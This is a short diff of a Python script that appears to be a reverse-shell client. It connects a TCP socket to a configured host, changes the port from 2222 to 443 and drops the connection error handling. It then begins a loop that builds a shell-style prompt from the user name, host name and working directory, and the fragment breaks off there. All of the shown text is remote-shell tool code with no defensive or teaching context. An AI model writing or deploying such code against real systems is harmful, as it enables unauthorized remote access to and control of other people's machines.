@@ -9,12 +9,11 @@ from time import sleep
 
 colorama.init()
 R_HOST = socket.gethostbyname(socket.gethostname())
-R_PORT = 2222
+R_PORT = 443
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-try:
-    sock.connect((R_HOST, R_PORT))
-except ConnectionRefusedError as err_msg:
-    print(err_msg)
+print("Initializing connection...")
+sock.connect((R_HOST, R_PORT))
+print("Connection established!")
 while True:
     try:
         header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}
